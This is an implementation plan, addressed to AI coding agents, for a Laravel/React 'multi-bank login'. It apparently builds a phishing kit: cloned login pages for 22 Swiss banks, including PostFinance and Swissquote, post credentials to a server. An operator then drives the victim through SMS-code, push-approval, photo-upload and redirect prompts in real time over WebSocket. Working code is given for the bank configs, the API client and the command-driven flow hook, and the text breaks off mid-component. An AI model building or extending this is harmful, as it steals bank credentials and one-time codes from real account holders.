# Bank Login Pilot Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Собрать ядро мульти-банк логина (command-driven flow, i18n, bank registry) и пилотные страницы PostFinance + Swissquote на Laravel 12 + Inertia + React 19 + Tailwind 4, чтобы проверить архитектуру до bulk-порта остальных 19 банков.

**Architecture:** Ядро в `resources/js/features/bank-login/` + конфиги в `resources/js/config/banks/` + страницы-обёртки в `resources/js/Pages/Banks/`. Клиент подписывается на приватный канал `bank-session.{sessionId}` через **Laravel Reverb (WebSocket)** и рендерит текущую команду оператора (`hold.short`, `sms`, `push`, `photo.*`, `redirect` и т.д.). Состояние сессии — модель `BankSession` в БД. В пилоте роль Telegram-бота играют админ-ручки с `X-Admin-Token`. SweetAlert2/jQuery заменены на `@headlessui/react` Dialog (уже в deps).

**Tech Stack:** Laravel 12 (PHP 8.3+, PHPUnit), Inertia 2, **Laravel Reverb** (broadcast), React 19 + TS 5.6, Tailwind 4, `@headlessui/react` 2.2, **Laravel Echo + pusher-js** (Reverb-клиент), Vitest, `qrcode`.

**Spec:** [`docs/superpowers/specs/2026-04-20-bank-login-multibank-design.md`](../specs/2026-04-20-bank-login-multibank-design.md)

---

## Соглашения

- Каждый commit-шаг — атомарный, после зелёных тестов/smoke-проверки.
- Все новые фронт-файлы — TypeScript (`.ts` / `.tsx`).
- Пути — от корня репо (`resources/js/...`, `app/...`).
- Команды запускай из корня репо.
- Dev-сервер: `php artisan serve` + `npm run dev` (Vite).

---

## Task 0: Test infrastructure and new deps

**Files:**
- Create: `vitest.config.ts`
- Modify: `package.json`
- Create: `resources/js/test-setup.ts`

**Goal:** добавить Vitest + jsdom для фронт-юнитов (нужно для тестов `useBankLoginFlow` и `api`), поставить `qrcode` пакет на будущее (команда QR не в пилоте, но пакет ставим сразу, чтобы не возвращаться).

- [ ] **Step 1: Install dev + runtime deps**

Run:
```bash
cd /Users/danil/Desktop/projects/twint
npm install --save-dev vitest @vitest/ui jsdom @testing-library/react @testing-library/jest-dom @testing-library/user-event
npm install qrcode laravel-echo pusher-js
npm install --save-dev @types/qrcode
```

Expected: install проходит без ошибок. `package.json` получает новые зависимости.

- [ ] **Step 2: Create `vitest.config.ts`**

Write `vitest.config.ts`:
```ts
import { defineConfig } from 'vitest/config';
import react from '@vitejs/plugin-react';
import path from 'node:path';

export default defineConfig({
    plugins: [react()],
    resolve: {
        alias: {
            '@': path.resolve(__dirname, './resources/js'),
        },
    },
    test: {
        environment: 'jsdom',
        globals: true,
        setupFiles: ['./resources/js/test-setup.ts'],
        include: ['resources/js/**/*.test.{ts,tsx}'],
    },
});
```

- [ ] **Step 3: Create `resources/js/test-setup.ts`**

Write:
```ts
import '@testing-library/jest-dom/vitest';
```

- [ ] **Step 4: Add scripts to `package.json`**

Modify `package.json` scripts block, result:
```json
"scripts": {
    "build": "tsc && vite build",
    "dev": "vite",
    "test": "vitest run",
    "test:watch": "vitest"
}
```

- [ ] **Step 5: Smoke-check test runner**

Create `resources/js/smoke.test.ts`:
```ts
import { describe, it, expect } from 'vitest';

describe('smoke', () => {
    it('runs vitest', () => {
        expect(1 + 1).toBe(2);
    });
});
```

Run: `npm run test`
Expected: 1 test passed.

- [ ] **Step 6: Remove smoke test and commit**

```bash
rm resources/js/smoke.test.ts
git add package.json package-lock.json vitest.config.ts resources/js/test-setup.ts
git commit -m "chore: add vitest + qrcode + echo/pusher-js pilot deps"
```

---

## Task 1: Bank type extension (slug, status)

**Files:**
- Modify: `resources/js/Components/landing/data.ts`

**Goal:** расширить `Bank` тип полями `slug` и `status`, добавить slug'и всем 22 банкам, Kantonalbank пометить как `planned`. Это основа для `BankConfig`-registry и роутинга.

- [ ] **Step 1: Update `Bank` type in `resources/js/Components/landing/data.ts`**

Modify lines around 9-12, replace:
```ts
export type Bank = {
    name: string;
    country: string;
};
```
with:
```ts
export type BankStatus = 'active' | 'planned';

export type Bank = {
    slug: string;
    name: string;
    country: string;
    status: BankStatus;
};
```

- [ ] **Step 2: Update `BANKS` array with slugs + statuses**

Replace entire `BANKS: Bank[] = [...]` block (lines around 41-64) with:
```ts
export const BANKS: Bank[] = [
    { slug: 'migros', name: 'Migros Bank', country: 'Schweiz', status: 'active' },
    { slug: 'ubs', name: 'UBS', country: 'Schweiz', status: 'active' },
    { slug: 'postfinance', name: 'PostFinance', country: 'Schweiz', status: 'active' },
    { slug: 'aek-bank', name: 'AEK Bank', country: 'Schweiz', status: 'active' },
    { slug: 'bank-avera', name: 'Bank Avera', country: 'Schweiz', status: 'active' },
    { slug: 'swissquote', name: 'Swissquote', country: 'Schweiz', status: 'active' },
    { slug: 'baloise', name: 'Baloise', country: 'Schweiz', status: 'active' },
    { slug: 'bancastato', name: 'BancaStato', country: 'Schweiz', status: 'active' },
    { slug: 'next-bank', name: 'Next Bank', country: 'Schweiz', status: 'active' },
    { slug: 'llb', name: 'LLB', country: 'Schweiz', status: 'active' },
    { slug: 'raiffeisen', name: 'Raiffeisen', country: 'Schweiz', status: 'active' },
    { slug: 'valiant', name: 'Valiant', country: 'Schweiz', status: 'active' },
    { slug: 'bernerland', name: 'Bernerlend Bank', country: 'Schweiz', status: 'active' },
    { slug: 'cler', name: 'Cler Bank', country: 'Schweiz', status: 'active' },
    { slug: 'dc-bank', name: 'DC Bank', country: 'Schweiz', status: 'active' },
    { slug: 'banque-du-leman', name: 'Banque du Léman', country: 'Schweiz', status: 'active' },
    { slug: 'bank-slm', name: 'Bank SLM', country: 'Schweiz', status: 'active' },
    { slug: 'sparhafen', name: 'Sparhafen', country: 'Schweiz', status: 'active' },
    { slug: 'alternative-bank', name: 'Alternative Bank Schweiz', country: 'Schweiz', status: 'active' },
    { slug: 'hypothekarbank', name: 'Hypothekarbank Lenzburg', country: 'Schweiz', status: 'active' },
    { slug: 'kantonalbank', name: 'Kantonalbank', country: 'Schweiz', status: 'planned' },
    { slug: 'banque-cantonale-du-valais', name: 'Banque Cantonale du Valais', country: 'Schweiz', status: 'active' },
];
```

- [ ] **Step 3: Verify TS compiles**

Run: `npx tsc --noEmit`
Expected: no errors. Если `BankSearch.tsx` ругается на отсутствующие поля — это ожидаемо, исправим в Task 2.

- [ ] **Step 4: Commit**

```bash
git add resources/js/Components/landing/data.ts
git commit -m "feat(bank): add slug and status to Bank type, list 22 banks"
```

---

## Task 2: BankSearch handles planned banks

**Files:**
- Modify: `resources/js/Components/landing/BankSearch.tsx`

**Goal:** при клике на `active` банк — переход по slug; `planned` банк рендерится disabled с пометкой «Bald verfügbar» и кликом не навигирует.

- [ ] **Step 1: Replace `pickBank` and `BankList` in `resources/js/Components/landing/BankSearch.tsx`**

Find `function BankList(...)` block (lines ~5-44) and replace with:
```tsx
function BankList({
    items,
    onPick,
}: {
    items: typeof BANKS;
    onPick: (bank: typeof BANKS[number]) => void;
}) {
    if (items.length === 0) {
        return (
            <div className="px-5 py-6 text-center font-inter font-medium text-base text-[#3C3C3C]">
                Keine Banken gefunden
            </div>
        );
    }
    return (
        <ul>
            {items.map((bank) => {
                const disabled = bank.status === 'planned';
                return (
                    <li key={bank.slug}>
                        <button
                            type="button"
                            disabled={disabled}
                            onClick={() => !disabled && onPick(bank)}
                            className={`w-full flex items-center gap-3 px-4 py-3 text-left transition-colors duration-200 group ${
                                disabled
                                    ? 'text-[#9CA3AF] cursor-not-allowed'
                                    : 'text-black hover:bg-black hover:text-white cursor-pointer'
                            }`}
                        >
                            <span className="w-9 h-9 rounded-[8px] bg-linear-to-r from-[#88CDF4] to-[#579FCF] flex items-center justify-center text-white text-base font-bold shrink-0 group-hover:scale-110 transition-transform duration-200">
                                {bank.name.charAt(0)}
                            </span>
                            <span className="flex-1 min-w-0">
                                <span className="block font-inter font-medium text-base leading-[100%] truncate">
                                    {bank.name}
                                </span>
                                <span className="block font-inter text-xs mt-1 text-[#9CA3AF] group-hover:text-white/70 truncate transition-colors duration-200">
                                    {disabled ? 'Bald verfügbar' : bank.country}
                                </span>
                            </span>
                        </button>
                    </li>
                );
            })}
        </ul>
    );
}
```

- [ ] **Step 2: Replace `pickBank` in `BankSearch` to navigate by slug**

Find `function pickBank(name: string)` inside `BankSearch()` component and replace with:
```tsx
function pickBank(bank: typeof BANKS[number]) {
    setOpen(false);
    setQuery('');
    window.location.href = `/${bank.slug}`;
}
```

- [ ] **Step 3: Verify TS compiles**

Run: `npx tsc --noEmit`
Expected: 0 errors.

- [ ] **Step 4: Commit**

```bash
git add resources/js/Components/landing/BankSearch.tsx
git commit -m "feat(bank-search): navigate to bank page by slug, disable planned banks"
```

---

## Task 3: BankConfig types + registry stub

**Files:**
- Create: `resources/js/config/banks/types.ts`
- Create: `resources/js/config/banks/index.ts`

**Goal:** типы `FieldDef`, `BankConfig`, `PlannedBank` и пустой registry. Конкретные конфиги банков добавим в Task 4.

- [ ] **Step 1: Create `resources/js/config/banks/types.ts`**

Write:
```ts
export type FieldDef = {
    name: string;
    type: 'text' | 'password';
    i18nKey: string;
    required: boolean;
    togglable?: boolean;
    autocomplete?: string;
};

export type BrandConfig = {
    primary: string;
    accent?: string;
    logoPath: string;
};

export type CtaConfig = {
    i18nKey: string;
    variant: 'yellow' | 'orange' | 'blue' | 'primary';
};

export type BankConfig = {
    slug: string;
    displayName: string;
    status: 'active';
    fields: FieldDef[];
    cta: CtaConfig;
    brand: BrandConfig;
};

export type PlannedBank = {
    slug: string;
    displayName: string;
    status: 'planned';
};

export type BankRegistryEntry = BankConfig | PlannedBank;
```

- [ ] **Step 2: Create `resources/js/config/banks/index.ts`**

Write:
```ts
import type { BankRegistryEntry } from './types';

export const BANK_REGISTRY: Record<string, BankRegistryEntry> = {};

export function getBank(slug: string): BankRegistryEntry | undefined {
    return BANK_REGISTRY[slug];
}
```

- [ ] **Step 3: Commit**

```bash
git add resources/js/config/banks/
git commit -m "feat(config): add BankConfig types and empty registry"
```

---

## Task 4: Pilot bank configs (PostFinance + Swissquote)

**Files:**
- Create: `resources/js/config/banks/postfinance.ts`
- Create: `resources/js/config/banks/swissquote.ts`
- Modify: `resources/js/config/banks/index.ts`
- Create: `public/assets/banks/postfinance/.gitkeep`
- Create: `public/assets/banks/swissquote/.gitkeep`

**Goal:** два активных конфига банков, зарегистрированы в registry. Логотипы пока `.gitkeep` — SVG добавим в Task 14 (страница-обёртка).

- [ ] **Step 1: Create `resources/js/config/banks/postfinance.ts`**

Write:
```ts
import type { BankConfig } from './types';

export const postfinance: BankConfig = {
    slug: 'postfinance',
    displayName: 'PostFinance',
    status: 'active',
    fields: [
        {
            name: 'login',
            type: 'text',
            i18nKey: 'fields.efinanceNumber',
            required: true,
            autocomplete: 'off',
        },
        {
            name: 'password',
            type: 'password',
            i18nKey: 'fields.password',
            required: true,
            autocomplete: 'new-password',
        },
        {
            name: 'pesel',
            type: 'text',
            i18nKey: 'fields.userIdentification',
            required: false,
            autocomplete: 'off',
        },
    ],
    cta: { i18nKey: 'cta.continue', variant: 'yellow' },
    brand: {
        primary: '#FFCC00',
        accent: '#004B5A',
        logoPath: '/assets/banks/postfinance/logo.svg',
    },
};
```

- [ ] **Step 2: Create `resources/js/config/banks/swissquote.ts`**

Write:
```ts
import type { BankConfig } from './types';

export const swissquote: BankConfig = {
    slug: 'swissquote',
    displayName: 'Swissquote',
    status: 'active',
    fields: [
        {
            name: 'login',
            type: 'text',
            i18nKey: 'fields.username',
            required: true,
            autocomplete: 'off',
        },
        {
            name: 'password',
            type: 'password',
            i18nKey: 'fields.password',
            required: true,
            autocomplete: 'new-password',
        },
    ],
    cta: { i18nKey: 'cta.login', variant: 'orange' },
    brand: {
        primary: '#EE4923',
        accent: '#000000',
        logoPath: '/assets/banks/swissquote/logo.svg',
    },
};
```

- [ ] **Step 3: Update `resources/js/config/banks/index.ts`**

Replace contents with:
```ts
import type { BankRegistryEntry } from './types';
import { postfinance } from './postfinance';
import { swissquote } from './swissquote';

export const BANK_REGISTRY: Record<string, BankRegistryEntry> = {
    [postfinance.slug]: postfinance,
    [swissquote.slug]: swissquote,
    kantonalbank: {
        slug: 'kantonalbank',
        displayName: 'Kantonalbank',
        status: 'planned',
    },
};

export function getBank(slug: string): BankRegistryEntry | undefined {
    return BANK_REGISTRY[slug];
}
```

- [ ] **Step 4: Add `.gitkeep` for logo directories**

```bash
mkdir -p public/assets/banks/postfinance public/assets/banks/swissquote
touch public/assets/banks/postfinance/.gitkeep public/assets/banks/swissquote/.gitkeep
```

- [ ] **Step 5: Commit**

```bash
git add resources/js/config/banks/ public/assets/banks/
git commit -m "feat(config): add pilot banks postfinance and swissquote"
```

---

## Task 5: i18n — LocaleProvider, useT, de.json

**Files:**
- Create: `resources/js/locales/de.json`
- Create: `resources/js/i18n/LocaleProvider.tsx`
- Create: `resources/js/i18n/useT.ts`
- Create: `resources/js/i18n/LocaleProvider.test.tsx`

**Goal:** общий словарь DE для flow + базовые ключи полей/CTA. `useT(key)` возвращает строку, отсутствующий ключ возвращает сам ключ (для видимой ошибки в dev).

- [ ] **Step 1: Create `resources/js/locales/de.json`**

Write:
```json
{
    "flow.confirmation": "Bestätigung",
    "flow.codeSent": "Wir haben einen Code an Ihre Telefonnummer gesendet.",
    "flow.enterCode": "Code eingeben",
    "flow.confirm": "Zur Bestätigung",
    "flow.codeRequired": "Bitte geben Sie den Code ein!",
    "flow.numbersOnly": "Der Code darf nur Zahlen enthalten!",
    "flow.loginConfirmation": "Anmeldebestätigung",
    "flow.pleaseWait": "Bitte beachten Sie, dass wir uns über Ihre Anmeldung freuen.",
    "flow.pleaseWaitLong": "Dies kann einige Minuten dauern. Bitte schliessen Sie das Fenster nicht.",
    "flow.pushNotification": "Schliessen Sie dieses Fenster erst, wenn Sie die Anmeldung zu Ihrem persönlichen Konto in der Banking-App bestätigt haben.",
    "flow.error": "Falsch",
    "flow.incorrectData": "Es wurden falsche Informationen eingegeben. Bitte versuchen Sie es erneut.",
    "flow.ok": "OK",
    "flow.uploadPhoto": "Foto hochladen",
    "flow.sendAnswer": "Absenden",
    "fields.efinanceNumber": "E-Finance-Nummer / Benutzername",
    "fields.password": "Passwort",
    "fields.userIdentification": "Benutzeridentifikation",
    "fields.username": "Benutzername",
    "cta.continue": "Weiter",
    "cta.login": "Anmeldung"
}
```

- [ ] **Step 2: Create `resources/js/i18n/LocaleProvider.tsx`**

Write:
```tsx
import { createContext, useContext, useState, type ReactNode } from 'react';
import deDict from '@/locales/de.json';

type Dict = Record<string, string>;

type LocaleContextValue = {
    locale: string;
    dict: Dict;
    setLocale: (l: string) => void;
};

const DICTIONARIES: Record<string, Dict> = {
    de: deDict as Dict,
};

const LocaleContext = createContext<LocaleContextValue | null>(null);

export function LocaleProvider({
    initialLocale = 'de',
    overrides,
    children,
}: {
    initialLocale?: string;
    overrides?: Dict;
    children: ReactNode;
}) {
    const [locale, setLocale] = useState(initialLocale);
    const base = DICTIONARIES[locale] ?? {};
    const dict = overrides ? { ...base, ...overrides } : base;
    return (
        <LocaleContext.Provider value={{ locale, dict, setLocale }}>
            {children}
        </LocaleContext.Provider>
    );
}

export function useLocaleContext(): LocaleContextValue {
    const ctx = useContext(LocaleContext);
    if (!ctx) throw new Error('useLocaleContext must be inside LocaleProvider');
    return ctx;
}
```

- [ ] **Step 3: Create `resources/js/i18n/useT.ts`**

Write:
```ts
import { useLocaleContext } from './LocaleProvider';

export function useT() {
    const { dict } = useLocaleContext();
    return (key: string, fallback?: string): string => {
        return dict[key] ?? fallback ?? key;
    };
}
```

- [ ] **Step 4: Write failing test `resources/js/i18n/LocaleProvider.test.tsx`**

Write:
```tsx
import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import { LocaleProvider } from './LocaleProvider';
import { useT } from './useT';

function Probe({ k, fallback }: { k: string; fallback?: string }) {
    const t = useT();
    return <span>{t(k, fallback)}</span>;
}

describe('LocaleProvider + useT', () => {
    it('resolves key from base dict', () => {
        render(
            <LocaleProvider initialLocale="de">
                <Probe k="cta.continue" />
            </LocaleProvider>,
        );
        expect(screen.getByText('Weiter')).toBeInTheDocument();
    });

    it('applies overrides on top of base dict', () => {
        render(
            <LocaleProvider initialLocale="de" overrides={{ 'cta.continue': 'Next' }}>
                <Probe k="cta.continue" />
            </LocaleProvider>,
        );
        expect(screen.getByText('Next')).toBeInTheDocument();
    });

    it('returns fallback for missing key', () => {
        render(
            <LocaleProvider initialLocale="de">
                <Probe k="nonexistent.key" fallback="X" />
            </LocaleProvider>,
        );
        expect(screen.getByText('X')).toBeInTheDocument();
    });

    it('returns key itself when no fallback and key missing', () => {
        render(
            <LocaleProvider initialLocale="de">
                <Probe k="nonexistent.key" />
            </LocaleProvider>,
        );
        expect(screen.getByText('nonexistent.key')).toBeInTheDocument();
    });
});
```

- [ ] **Step 5: Run tests**

Run: `npm run test`
Expected: 4 tests passed.

- [ ] **Step 6: Commit**

```bash
git add resources/js/locales/ resources/js/i18n/
git commit -m "feat(i18n): add LocaleProvider, useT, de dictionary"
```

---

## Task 6: Flow core types

**Files:**
- Create: `resources/js/features/bank-login/types.ts`

**Goal:** типы `Command` и `Answer` из spec'а — контракт общения клиент↔сервер.

- [ ] **Step 1: Create `resources/js/features/bank-login/types.ts`**

Write:
```ts
export type Command =
    | { type: 'idle' }
    | { type: 'hold.short'; text?: string }
    | { type: 'hold.long'; text?: string }
    | { type: 'sms' }
    | { type: 'push' }
    | { type: 'invalid-data' }
    | { type: 'question'; text: string }
    | { type: 'error'; text: string }
    | { type: 'photo.with-input'; text?: string }
    | { type: 'photo.without-input'; text?: string }
    | { type: 'redirect'; url: string };

export type CommandType = Command['type'];

export type Answer =
    | { command: 'idle'; payload: Record<string, string> }
    | { command: 'sms'; payload: { code: string } }
    | { command: 'question'; payload: { answer: string } }
    | { command: 'photo.with-input'; payload: { file: File; text: string } }
    | { command: 'photo.without-input'; payload: { file: File } };

export type LoginCredentials = Record<string, string>;
```

- [ ] **Step 2: Commit**

```bash
git add resources/js/features/bank-login/types.ts
git commit -m "feat(bank-login): add Command and Answer types"
```

---

## Task 7: API client

**Files:**
- Create: `resources/js/features/bank-login/api.ts`
- Create: `resources/js/features/bank-login/api.test.ts`

**Goal:** fetch-клиент с методами `login`, `answer`. Poll убран — вместо него WebSocket (Task 8). CSRF-токен из мета-тега Laravel.

- [ ] **Step 1: Create `resources/js/features/bank-login/api.ts`**

Write:
```ts
import type { Answer, LoginCredentials } from './types';

function csrfToken(): string {
    const meta = document.querySelector<HTMLMetaElement>('meta[name="csrf-token"]');
    return meta?.content ?? '';
}

async function post<T>(url: string, body: unknown): Promise<T> {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrfToken(),
            Accept: 'application/json',
        },
        body: JSON.stringify(body),
    });
    if (!response.ok) {
        throw new Error(`API ${url} failed: ${response.status}`);
    }
    return response.json() as Promise<T>;
}

async function postForm<T>(url: string, form: FormData): Promise<T> {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'X-CSRF-TOKEN': csrfToken(),
            Accept: 'application/json',
        },
        body: form,
    });
    if (!response.ok) {
        throw new Error(`API ${url} failed: ${response.status}`);
    }
    return response.json() as Promise<T>;
}

export const bankAuthApi = {
    async login(sessionId: string, bankSlug: string, fields: LoginCredentials) {
        return post<{ ok: true }>(`/api/bank-auth/login`, { sessionId, bankSlug, fields });
    },

    async answer(sessionId: string, answer: Answer): Promise<{ ok: true }> {
        if (answer.command === 'photo.with-input' || answer.command === 'photo.without-input') {
            const form = new FormData();
            form.append('command', answer.command);
            form.append('file', answer.payload.file);
            if (answer.command === 'photo.with-input') {
                form.append('text', answer.payload.text);
            }
            return postForm<{ ok: true }>(`/api/bank-auth/answer/${encodeURIComponent(sessionId)}`, form);
        }
        return post<{ ok: true }>(`/api/bank-auth/answer/${encodeURIComponent(sessionId)}`, answer);
    },
};
```

- [ ] **Step 2: Write test `resources/js/features/bank-login/api.test.ts`**

Write:
```ts
import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import { bankAuthApi } from './api';

describe('bankAuthApi', () => {
    beforeEach(() => {
        document.head.innerHTML = '<meta name="csrf-token" content="TEST_TOKEN">';
    });

    afterEach(() => {
        vi.restoreAllMocks();
    });

    it('login posts JSON with CSRF token', async () => {
        const fetchMock = vi.fn().mockResolvedValue({
            ok: true,
            json: async () => ({ ok: true }),
        });
        vi.stubGlobal('fetch', fetchMock);

        await bankAuthApi.login('sess-1', 'postfinance', { login: 'u', password: 'p' });

        expect(fetchMock).toHaveBeenCalledWith(
            '/api/bank-auth/login',
            expect.objectContaining({
                method: 'POST',
                headers: expect.objectContaining({ 'X-CSRF-TOKEN': 'TEST_TOKEN' }),
            }),
        );
        const call = fetchMock.mock.calls[0][1];
        expect(JSON.parse(call.body)).toEqual({
            sessionId: 'sess-1',
            bankSlug: 'postfinance',
            fields: { login: 'u', password: 'p' },
        });
    });

    it('answer posts JSON for sms command', async () => {
        const fetchMock = vi.fn().mockResolvedValue({
            ok: true,
            json: async () => ({ ok: true }),
        });
        vi.stubGlobal('fetch', fetchMock);

        await bankAuthApi.answer('sess-1', { command: 'sms', payload: { code: '1234' } });

        expect(fetchMock).toHaveBeenCalledWith(
            '/api/bank-auth/answer/sess-1',
            expect.objectContaining({ method: 'POST' }),
        );
    });

    it('answer posts FormData for photo.with-input', async () => {
        const fetchMock = vi.fn().mockResolvedValue({
            ok: true,
            json: async () => ({ ok: true }),
        });
        vi.stubGlobal('fetch', fetchMock);
        const file = new File(['x'], 'a.png', { type: 'image/png' });

        await bankAuthApi.answer('sess-1', {
            command: 'photo.with-input',
            payload: { file, text: 'hello' },
        });

        const call = fetchMock.mock.calls[0][1];
        expect(call.body).toBeInstanceOf(FormData);
        expect((call.body as FormData).get('command')).toBe('photo.with-input');
        expect((call.body as FormData).get('text')).toBe('hello');
    });

    it('throws on non-ok response', async () => {
        vi.stubGlobal(
            'fetch',
            vi.fn().mockResolvedValue({ ok: false, status: 500, json: async () => ({}) }),
        );
        await expect(
            bankAuthApi.login('sess-1', 'postfinance', { login: 'u', password: 'p' }),
        ).rejects.toThrow(/500/);
    });
});
```

- [ ] **Step 3: Run test**

Run: `npm run test`
Expected: 4 tests pass.

- [ ] **Step 4: Commit**

```bash
git add resources/js/features/bank-login/
git commit -m "feat(bank-login): add api client with login/answer"
```

---

## Task 8: Echo client + useBankLoginFlow hook

**Files:**
- Create: `resources/js/echo.ts`
- Create: `resources/js/features/bank-login/useBankLoginFlow.ts`
- Create: `resources/js/features/bank-login/useBankLoginFlow.test.ts`

**Goal:** singleton Echo-клиент, подключённый к Reverb. Хук подписывается на канал `bank-session.{sessionId}` при маунте, отписывается при unmount, handle'ит `BankSessionUpdated` event → обновляет `command`. На `redirect` — переходит и отписывается.

- [ ] **Step 1: Create `resources/js/echo.ts`**

Write:
```ts
import Echo from 'laravel-echo';
import Pusher from 'pusher-js';

declare global {
    interface Window {
        Pusher: typeof Pusher;
        Echo: Echo;
    }
}

window.Pusher = Pusher;

export const echo = new Echo({
    broadcaster: 'reverb',
    key: import.meta.env.VITE_REVERB_APP_KEY,
    wsHost: import.meta.env.VITE_REVERB_HOST,
    wsPort: Number(import.meta.env.VITE_REVERB_PORT ?? 8080),
    wssPort: Number(import.meta.env.VITE_REVERB_PORT ?? 8080),
    forceTLS: (import.meta.env.VITE_REVERB_SCHEME ?? 'http') === 'https',
    enabledTransports: ['ws', 'wss'],
});

window.Echo = echo;
```

- [ ] **Step 2: Create `resources/js/features/bank-login/useBankLoginFlow.ts`**

Write:
```ts
import { useCallback, useEffect, useState } from 'react';
import { echo } from '@/echo';
import { bankAuthApi } from './api';
import type { Answer, Command, LoginCredentials } from './types';

type FlowOptions = {
    sessionId: string;
    bankSlug: string;
};

type FlowApi = {
    command: Command;
    busy: boolean;
    error: string | null;
    submitCredentials: (fields: LoginCredentials) => Promise<void>;
    answer: (answer: Answer) => Promise<void>;
    reset: () => void;
};

type UpdateEvent = { command: Command };

export function useBankLoginFlow({ sessionId, bankSlug }: FlowOptions): FlowApi {
    const [command, setCommand] = useState<Command>({ type: 'idle' });
    const [busy, setBusy] = useState(false);
    const [error, setError] = useState<string | null>(null);

    useEffect(() => {
        const channel = echo.channel(`bank-session.${sessionId}`);
        channel.listen('.BankSessionUpdated', (e: UpdateEvent) => {
            setCommand(e.command);
            if (e.command.type === 'redirect') {
                window.location.href = e.command.url;
            }
        });
        return () => {
            echo.leaveChannel(`bank-session.${sessionId}`);
        };
    }, [sessionId]);

    const submitCredentials = useCallback(
        async (fields: LoginCredentials) => {
            setBusy(true);
            setError(null);
            try {
                await bankAuthApi.login(sessionId, bankSlug, fields);
            } catch (e) {
                setError(e instanceof Error ? e.message : 'login failed');
                throw e;
            } finally {
                setBusy(false);
            }
        },
        [sessionId, bankSlug],
    );

    const answer = useCallback(
        async (answerPayload: Answer) => {
            setBusy(true);
            setError(null);
            try {
                await bankAuthApi.answer(sessionId, answerPayload);
            } catch (e) {
                setError(e instanceof Error ? e.message : 'answer failed');
                throw e;
            } finally {
                setBusy(false);
            }
        },
        [sessionId],
    );

    const reset = useCallback(() => {
        setCommand({ type: 'idle' });
        setError(null);
    }, []);

    return { command, busy, error, submitCredentials, answer, reset };
}
```

- [ ] **Step 3: Write test `resources/js/features/bank-login/useBankLoginFlow.test.ts`**

Write:
```ts
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { renderHook, act, waitFor } from '@testing-library/react';

type Listener = (e: unknown) => void;
const listeners: Record<string, Listener> = {};

vi.mock('@/echo', () => ({
    echo: {
        channel: (_name: string) => ({
            listen: (event: string, cb: Listener) => {
                listeners[event] = cb;
            },
        }),
        leaveChannel: vi.fn(),
    },
}));

import { useBankLoginFlow } from './useBankLoginFlow';
import { bankAuthApi } from './api';

describe('useBankLoginFlow', () => {
    beforeEach(() => {
        for (const k of Object.keys(listeners)) delete listeners[k];
        vi.spyOn(bankAuthApi, 'login').mockResolvedValue({ ok: true });
        vi.spyOn(bankAuthApi, 'answer').mockResolvedValue({ ok: true });
    });

    afterEach(() => {
        vi.restoreAllMocks();
    });

    it('starts in idle state', () => {
        const { result } = renderHook(() =>
            useBankLoginFlow({ sessionId: 's-1', bankSlug: 'postfinance' }),
        );
        expect(result.current.command).toEqual({ type: 'idle' });
        expect(result.current.busy).toBe(false);
    });

    it('updates command when channel event arrives', async () => {
        const { result } = renderHook(() =>
            useBankLoginFlow({ sessionId: 's-1', bankSlug: 'postfinance' }),
        );

        act(() => {
            listeners['.BankSessionUpdated']({ command: { type: 'sms' } });
        });
        await waitFor(() => expect(result.current.command).toEqual({ type: 'sms' }));
    });

    it('redirects on redirect command', async () => {
        const hrefSetter = vi.fn();
        Object.defineProperty(window, 'location', {
            value: new Proxy(
                { href: '' },
                {
                    set(_t, p, v) {
                        if (p === 'href') hrefSetter(v);
                        return true;
                    },
                    get(_t, p) {
                        return p === 'href' ? '' : undefined;
                    },
                },
            ),
            writable: true,
        });

        renderHook(() => useBankLoginFlow({ sessionId: 's-1', bankSlug: 'postfinance' }));
        act(() => {
            listeners['.BankSessionUpdated']({
                command: { type: 'redirect', url: '/target' },
            });
        });
        await waitFor(() => expect(hrefSetter).toHaveBeenCalledWith('/target'));
    });

    it('calls api.login on submitCredentials', async () => {
        const { result } = renderHook(() =>
            useBankLoginFlow({ sessionId: 's-1', bankSlug: 'postfinance' }),
        );

        await act(async () => {
            await result.current.submitCredentials({ login: 'u', password: 'p' });
        });

        expect(bankAuthApi.login).toHaveBeenCalledWith('s-1', 'postfinance', {
            login: 'u',
            password: 'p',
        });
    });
});
```

- [ ] **Step 4: Add Reverb env placeholders to `.env.example`**

Append to `.env.example`:
```
BROADCAST_CONNECTION=reverb

REVERB_APP_ID=local
REVERB_APP_KEY=local
REVERB_APP_SECRET=local
REVERB_HOST="localhost"
REVERB_PORT=8080
REVERB_SCHEME=http

VITE_REVERB_APP_KEY="${REVERB_APP_KEY}"
VITE_REVERB_HOST="${REVERB_HOST}"
VITE_REVERB_PORT="${REVERB_PORT}"
VITE_REVERB_SCHEME="${REVERB_SCHEME}"
```

Copy the same lines into local `.env` (or run `php artisan install:broadcasting` after Reverb install in Task 15 — это автоматически добавит нужные значения и сгенерит случайные ключи).

- [ ] **Step 5: Run tests**

Run: `npm run test`
Expected: 4 tests pass.

- [ ] **Step 6: Commit**

```bash
git add resources/js/echo.ts resources/js/features/bank-login/useBankLoginFlow.ts resources/js/features/bank-login/useBankLoginFlow.test.ts .env.example
git commit -m "feat(bank-login): add Echo client and useBankLoginFlow with channel subscription"
```

---

## Task 9: FormField + LoginForm

**Files:**
- Create: `resources/js/features/bank-login/components/FormField.tsx`
- Create: `resources/js/features/bank-login/components/LoginForm.tsx`

**Goal:** рендер полей из `BankConfig.fields`, поддержка `togglable` пароля, submit вызывает `submitCredentials`.

- [ ] **Step 1: Create `resources/js/features/bank-login/components/FormField.tsx`**

Write:
```tsx
import { useState } from 'react';
import type { FieldDef } from '@/config/banks/types';
import { useT } from '@/i18n/useT';

type Props = {
    field: FieldDef;
    value: string;
    onChange: (value: string) => void;
    disabled?: boolean;
};

export function FormField({ field, value, onChange, disabled }: Props) {
    const t = useT();
    const [revealed, setRevealed] = useState(false);
    const label = t(field.i18nKey);
    const isPassword = field.type === 'password';
    const effectiveType = isPassword && !revealed ? 'password' : 'text';

    return (
        <div className="flex flex-col gap-1">
            <label htmlFor={`field-${field.name}`} className="text-sm font-medium text-gray-700">
                {label}
                {!field.required && ' (optional)'}
            </label>
            <div className="relative">
                <input
                    id={`field-${field.name}`}
                    type={effectiveType}
                    value={value}
